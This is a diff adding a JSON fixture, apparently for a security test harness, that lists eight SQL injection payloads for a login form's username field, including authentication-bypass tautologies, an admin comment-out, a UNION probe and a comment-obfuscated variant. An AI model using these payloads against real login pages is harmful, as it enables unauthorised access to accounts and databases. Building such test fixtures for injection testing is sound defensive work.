@@ -1,0 +1,85 @@
+
+{
+  "variants": [
+    {
+      "id": "P01",
+      "payload": {
+        "csrf_mode": "valid",
+        "fields": {
+          "username": "'",
+          "password": "dummy-only-not-real"
+        }
+      }
+    },
+    {
+      "id": "P02",
+      "payload": {
+        "csrf_mode": "valid",
+        "fields": {
+          "username": "' OR '1'='1' -- ",
+          "password": "dummy-only-not-real"
+        }
+      }
+    },
+    {
+      "id": "P03",
+      "payload": {
+        "csrf_mode": "valid",
+        "fields": {
+          "username": "' OR '1'='2' -- ",
+          "password": "dummy-only-not-real"
+        }
+      }
+    },
+    {
+      "id": "P04",
+      "payload": {
+        "csrf_mode": "valid",
+        "fields": {
+          "username": "admin' -- ",
+          "password": "dummy-only-not-real"
+        }
+      }
+    },
+    {
+      "id": "P05",
+      "payload": {
+        "csrf_mode": "valid",
+        "fields": {
+          "username": "\" OR \"1\"=\"1\" -- ",
+          "password": "dummy-only-not-real"
+        }
+      }
+    },
+    {
+      "id": "P06",
+      "payload": {
+        "csrf_mode": "valid",
+        "fields": {
+          "username": "') OR ('1'='1' -- ",
+          "password": "dummy-only-not-real"
+        }
+      }
+    },
+    {
+      "id": "P07",
+      "payload": {
+        "csrf_mode": "valid",
+        "fields": {
+          "username": "' UNION SELECT NULL -- ",
+          "password": "dummy-only-not-real"
+        }
+      }
+    },
+    {
+      "id": "P08",
+      "payload": {
+        "csrf_mode": "valid",
+        "fields": {
+          "username": "'/**/OR/**/'1'='1'-- ",
+          "password": "dummy-only-not-real"
+        }
+      }
+    }
+  ]
+}
